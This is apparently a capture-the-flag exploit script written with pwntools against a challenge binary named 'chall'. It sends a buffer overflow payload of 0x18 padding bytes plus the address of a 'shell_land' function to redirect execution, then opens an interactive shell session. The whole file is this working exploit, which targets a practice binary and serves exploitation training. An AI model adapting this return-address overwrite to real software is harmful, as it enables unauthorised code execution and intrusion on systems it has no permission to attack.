#!/usr/bin/env python3

from pwn import *

exe = ELF("./bin/chall")

context.binary = exe

host = args.HOST or 'localhost'
port = args.PORT or 31680

def local():
  return process([exe.path])

def conn():
  if args.LOCAL:
    return local()
  else:
    return remote(host, port)

def debug():
  if args.LOCAL:
    gdb.attach(r, gdbscript=gdbscript)
    pause()

gdbscript = f'''
file {exe.path}
'''

r = conn()

# good luck pwning :)

r.sendline(b'A'*0x18 + p64(exe.sym['shell_land'] + 5))

r.interactive()
